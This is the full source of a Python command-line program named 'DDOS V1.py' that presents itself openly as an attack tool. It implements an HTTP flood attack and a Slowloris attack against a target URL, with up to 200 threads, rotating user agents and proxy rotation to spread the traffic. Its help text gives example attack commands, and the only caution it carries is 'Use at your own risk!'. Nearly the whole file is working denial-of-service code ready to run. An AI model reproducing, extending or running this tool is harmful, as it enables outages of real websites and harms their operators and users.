#!/usr/bin/env python3
"""
DDOS V1.py - Advanced DDoS Tool (Command Line Version)
========================================================
Version: 2026.0 - Ultimate Edition
Features:
- HTTP Flood Attack
- Slowloris Attack
- Multi-threaded Attacks
- Proxy Support
- Custom Port Support
- URL Targeting
- Rate Limiting Control
- Timeout Configuration
"""

import argparse
import requests
import threading
import time
import random
import socket
import sys
import os
from urllib.parse import urlparse
import urllib3
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================
# VERSION INFORMATION
# ============================================
VERSION = "2026.0"
RELEASE_DATE = "2026-01-01"
BUILD_NUMBER = "2026.001"
AUTHOR = "Security Research Team"

# ============================================
# COLOR CODES
# ============================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

# ============================================
# MAIN DDOS CLASS
# ============================================
class AdvancedDDosTool:
    """Advanced DDoS Tool - Command Line Version"""

    def __init__(self, args):
        self.args = args
        self.running = False
        self.threads = []
        self.proxies = []
        self.proxy_index = 0
        self.total_requests = 0
        self.start_time = None
        self.stats_lock = threading.Lock()
        
        # Parse target and port
        self.target_url = args.url
        self.port = args.port or self.get_port_from_url()
        self.attack_mode = args.mode or "http"
        self.thread_count = args.threads or 20
        self.request_rate = args.rate or 10
        self.timeout = args.timeout or 5
        self.proxy_file = args.proxy or "proxies.txt"
        self.duration = args.duration or 0
        self.verbose = args.verbose or False
        
        # Load proxies
        self.load_proxies()
        
        # Print banner
        self.print_banner()

    def get_port_from_url(self):
        """Extract port from URL"""
        parsed = urlparse(self.target_url)
        if parsed.port:
            return parsed.port
        return 443 if parsed.scheme == "https" else 80

    def print_banner(self):
        """Print banner"""
        art = r"""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║     ██████╗ ██████╗  ██████╗ ███████╗                           ║
║     ██╔══██╗██╔══██╗██╔═══██╗██╔════╝                           ║
║     ██║  ██║██████╔╝██║   ██║███████╗                           ║
║     ██║  ██║██╔══██╗██║   ██║╚════██║                           ║
║     ██████╔╝██║  ██║╚██████╔╝███████║                           ║
║     ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝                           ║
║                                                                  ║
║              Advanced DDoS Tool - Command Line                   ║
║                     Version: 2026.0                              ║
║                                                                  ║
╚══════════════════════════════════════════════════════════════════╝"""
        
        print(Colors.RED + art + Colors.RESET)
        print(Colors.CYAN + "=" * 70 + Colors.RESET)
        print(Colors.GREEN + f"[+] Author: {AUTHOR}")
        print(Colors.GREEN + f"[+] Version: {VERSION}")
        print(Colors.GREEN + f"[+] Build: {BUILD_NUMBER}")
        print(Colors.CYAN + "=" * 70 + Colors.RESET)
        print(Colors.YELLOW + "[!] Warning: Use at your own risk!")
        print(Colors.CYAN + "=" * 70 + Colors.RESET + "\n")

    def load_proxies(self):
        """Load proxies from file"""
        self.proxies = []
        if self.proxy_file and os.path.exists(self.proxy_file):
            try:
                with open(self.proxy_file, 'r') as f:
                    lines = f.readlines()
                    for line in lines:
                        line = line.strip()
                        if line:
                            self.proxies.append(line)
                if self.verbose:
                    print(Colors.GREEN + f"[+] Loaded {len(self.proxies)} proxies from {self.proxy_file}" + Colors.RESET)
            except Exception as e:
                print(Colors.RED + f"[-] Error loading proxies: {e}" + Colors.RESET)
        else:
            if self.verbose:
                print(Colors.YELLOW + "[!] No proxy file found. Using direct connection." + Colors.RESET)
        return self.proxies

    def get_next_proxy(self):
        """Get next proxy from list"""
        if not self.proxies:
            return None
        self.proxy_index = (self.proxy_index + 1) % len(self.proxies)
        proxy = self.proxies[self.proxy_index]
        return {"http": f"http://{proxy}", "https": f"http://{proxy}"}

    def http_flood(self, target, rate, timeout):
        """HTTP Flood Attack"""
        delay = 1.0 / rate if rate > 0 else 0.1
        
        # Build target URL with port
        parsed = urlparse(target)
        port = self.port
        if parsed.port:
            port = parsed.port
        base_url = f"{parsed.scheme}://{parsed.hostname}:{port}{parsed.path or '/'}"
        
        headers = {
            'User-Agent': random.choice([
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15',
            ]),
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
        }
        
        while self.running:
            proxy = self.get_next_proxy()
            try:
                # Randomize URL path for variety
                path = random.choice(['', '/', '/index.html', '/home', '/about', '/contact'])
                full_url = base_url.rstrip('/') + path
                
                response = requests.get(full_url, headers=headers, proxies=proxy, 
                                      timeout=timeout, verify=False)
                
                with self.stats_lock:
                    self.total_requests += 1
                
                if self.verbose:
                    status = response.status_code
                    proxy_str = f"via {proxy['http']}" if proxy else "direct"
                    print(Colors.GREEN + f"[+] Request #{self.total_requests} sent - Status: {status} - {proxy_str}" + Colors.RESET)
                    
            except requests.exceptions.RequestException as e:
                if self.verbose:
                    proxy_str = f"via {proxy['http']}" if proxy else "direct"
                    print(Colors.RED + f"[-] Error: {str(e)[:50]} - {proxy_str}" + Colors.RESET)
            
            except Exception as e:
                if self.verbose:
                    print(Colors.RED + f"[-] Unexpected error: {e}" + Colors.RESET)
            
            time.sleep(delay)

    def slowloris(self, target, rate, timeout):
        """Slowloris Attack"""
        delay = 1.0 / rate if rate > 0 else 0.1
        parsed = urlparse(target)
        host = parsed.hostname
        port = self.port or (443 if parsed.scheme == "https" else 80)
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((host, port))
                
                # Send initial GET request
                request = f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n"
                sock.send(request.encode())
                
                with self.stats_lock:
                    self.total_requests += 1
                
                if self.verbose:
                    print(Colors.GREEN + f"[+] Slowloris connection opened to {host}:{port} - #{self.total_requests}" + Colors.RESET)
                
                # Keep connection alive by sending headers periodically
                while self.running:
                    headers = [
                        f"X-{random.randint(1000, 9999)}: {random.randint(1, 9999)}",
                        f"Accept-{random.randint(1000, 9999)}: {random.choice(['text/html', 'application/json', 'image/*'])}",
                        f"Cache-{random.randint(1000, 9999)}: {random.choice(['no-cache', 'max-age=0'])}"
                    ]
                    
                    sock.send(f"{random.choice(headers)}\r\n".encode())
                    time.sleep(random.uniform(10, 15))  # Slow data sending
                    
            except socket.error as e:
                if self.verbose:
                    print(Colors.RED + f"[-] Socket error: {e}" + Colors.RESET)
            except Exception as e:
                if self.verbose:
                    print(Colors.RED + f"[-] Slowloris error: {e}" + Colors.RESET)
            finally:
                try:
                    sock.close()
                except:
                    pass
            
            time.sleep(delay)

    def start_attack(self):
        """Start the DDoS attack"""
        # Validate arguments
        if not self.target_url:
            print(Colors.RED + "[-] No target URL specified!" + Colors.RESET)
            return False

        if not urlparse(self.target_url).scheme:
            print(Colors.RED + "[-] Invalid URL. Use http:// or https://" + Colors.RESET)
            return False

        if not (1 <= self.thread_count <= 200):
            print(Colors.RED + "[-] Threads must be between 1 and 200" + Colors.RESET)
            return False

        if not (1 <= self.request_rate <= 100):
            print(Colors.RED + "[-] Request rate must be between 1 and 100" + Colors.RESET)
            return False

        if not (1 <= self.timeout <= 10):
            print(Colors.RED + "[-] Timeout must be between 1 and 10" + Colors.RESET)
            return False

        # Print attack info
        print(Colors.CYAN + "=" * 70 + Colors.RESET)
        print(Colors.GREEN + "[+] Attack Configuration:" + Colors.RESET)
        print(Colors.CYAN + f"    Target: {self.target_url}" + Colors.RESET)
        print(Colors.CYAN + f"    Port: {self.port}" + Colors.RESET)
        print(Colors.CYAN + f"    Mode: {self.attack_mode.upper()}" + Colors.RESET)
        print(Colors.CYAN + f"    Threads: {self.thread_count}" + Colors.RESET)
        print(Colors.CYAN + f"    Rate: {self.request_rate}/sec per thread" + Colors.RESET)
        print(Colors.CYAN + f"    Timeout: {self.timeout}s" + Colors.RESET)
        print(Colors.CYAN + f"    Proxies: {len(self.proxies)} loaded" + Colors.RESET)
        if self.duration > 0:
            print(Colors.CYAN + f"    Duration: {self.duration}s" + Colors.RESET)
        print(Colors.CYAN + "=" * 70 + Colors.RESET)

        print(Colors.RED + "[!] Starting attack... Press Ctrl+C to stop" + Colors.RESET)
        
        self.running = True
        self.start_time = datetime.now()
        self.total_requests = 0

        # Choose attack function
        attack_func = self.http_flood if self.attack_mode.lower() == "http" else self.slowloris
        
        # Start threads
        for i in range(self.thread_count):
            t = threading.Thread(
                target=attack_func, 
                args=(self.target_url, self.request_rate, self.timeout),
                daemon=True
            )
            self.threads.append(t)
            t.start()
            time.sleep(0.01)  # Small delay between thread creation

        # Monitor attack
        try:
            if self.duration > 0:
                # Attack with duration limit
                time.sleep(self.duration)
                self.stop_attack()
            else:
                # Attack until Ctrl+C
                while self.running:
                    # Print stats every 5 seconds
                    time.sleep(5)
                    elapsed = (datetime.now() - self.start_time).total_seconds()
                    if self.verbose:
                        rps = self.total_requests / elapsed if elapsed > 0 else 0
                        print(Colors.YELLOW + f"[📊] Total Requests: {self.total_requests} | RPS: {rps:.2f} | Threads: {self.thread_count}" + Colors.RESET)

        except KeyboardInterrupt:
            print(Colors.YELLOW + "\n[!] Interrupted by user" + Colors.RESET)
            self.stop_attack()

        return True

    def stop_attack(self):
        """Stop the DDoS attack"""
        self.running = False
        
        # Wait for threads to finish
        for t in self.threads:
            if t.is_alive():
                t.join(timeout=1)
        
        elapsed = (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        
        print(Colors.CYAN + "=" * 70 + Colors.RESET)
        print(Colors.GREEN + "[+] Attack Stopped!" + Colors.RESET)
        print(Colors.CYAN + f"    Total Requests: {self.total_requests}" + Colors.RESET)
        print(Colors.CYAN + f"    Duration: {elapsed:.2f} seconds" + Colors.RESET)
        if elapsed > 0:
            print(Colors.CYAN + f"    Average RPS: {self.total_requests / elapsed:.2f}" + Colors.RESET)
        print(Colors.CYAN + "=" * 70 + Colors.RESET)
        
        self.threads = []

# ============================================
# COMMAND LINE ARGUMENTS
# ============================================
def parse_arguments():
    """Parse command line arguments"""
    parser = argparse.ArgumentParser(
        description='Advanced DDoS Tool - Command Line Version',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
╔══════════════════════════════════════════════════════════════════════════════╗
║                              EXAMPLES                                        ║
╠══════════════════════════════════════════════════════════════════════════════╣
║                                                                              ║
║  Basic HTTP Flood Attack:                                                    ║
║  python DDos_V1.py --url https://example.com --mode http --threads 50      ║
║                                                                              ║
║  Slowloris Attack with Custom Port:                                         ║
║  python DDos_V1.py --url https://example.com --port 8080 --mode slowloris   ║
║                                                                              ║
║  Attack with Proxies and Rate Control:                                      ║
║  python DDos_V1.py --url https://example.com --proxy proxies.txt --rate 20  ║
║                                                                              ║
║  Timed Attack (30 seconds):                                                  ║
║  python DDos_V1.py --url https://example.com --duration 30 --threads 100   ║
║                                                                              ║
║  Verbose Mode with Custom Settings:                                         ║
║  python DDos_V1.py --url https://example.com --port 443 --mode http        ║
║  --threads 50 --rate 25 --timeout 3 --verbose                              ║
║                                                                              ║
║  Help:                                                                       ║
║  python DDos_V1.py --help                                                   ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
        """
    )

    # Required arguments
    parser.add_argument(
        '--url', '-u',
        required=True,
        help='Target URL (e.g., https://example.com)'
    )

    # Attack configuration
    parser.add_argument(
        '--port', '-p',
        type=int,
        help='Target port (default: 443 for HTTPS, 80 for HTTP)'
    )

    parser.add_argument(
        '--mode', '-m',
        choices=['http', 'slowloris'],
        default='http',
        help='Attack mode: http or slowloris (default: http)'
    )

    parser.add_argument(
        '--threads', '-t',
        type=int,
        default=20,
        help='Number of threads (1-200, default: 20)'
    )

    parser.add_argument(
        '--rate', '-r',
        type=int,
        default=10,
        help='Requests per second per thread (1-100, default: 10)'
    )

    parser.add_argument(
        '--timeout', '-T',
        type=int,
        default=5,
        help='Request timeout in seconds (1-10, default: 5)'
    )

    parser.add_argument(
        '--duration', '-d',
        type=int,
        default=0,
        help='Attack duration in seconds (0 = unlimited, default: 0)'
    )

    # Proxy options
    parser.add_argument(
        '--proxy', '-P',
        type=str,
        default='proxies.txt',
        help='Path to proxy file (format: ip:port per line)'
    )

    # Additional options
    parser.add_argument(
        '--verbose', '-v',
        action='store_true',
        help='Enable verbose output'
    )

    parser.add_argument(
        '--version',
        action='version',
        version=f'DDos V1.py v{VERSION}'
    )

    return parser.parse_args()

# ============================================
# MAIN FUNCTION
# ============================================
def main():
    """Main function"""
    try:
        args = parse_arguments()
        
        # Create tool instance
        tool = AdvancedDDosTool(args)
        
        # Start attack
        tool.start_attack()
        
        print(Colors.GREEN + "\n[+] Attack completed successfully!" + Colors.RESET)
        return 0
        
    except KeyboardInterrupt:
        print(Colors.YELLOW + "\n[!] Interrupted by user" + Colors.RESET)
        return 130
    except Exception as e:
        print(Colors.RED + f"\n[-] Fatal Error: {e}" + Colors.RESET)
        import traceback
        traceback.print_exc()
        return 1

# ============================================
# ENTRY POINT
# ============================================
if __name__ == "__main__":
    sys.exit(main())
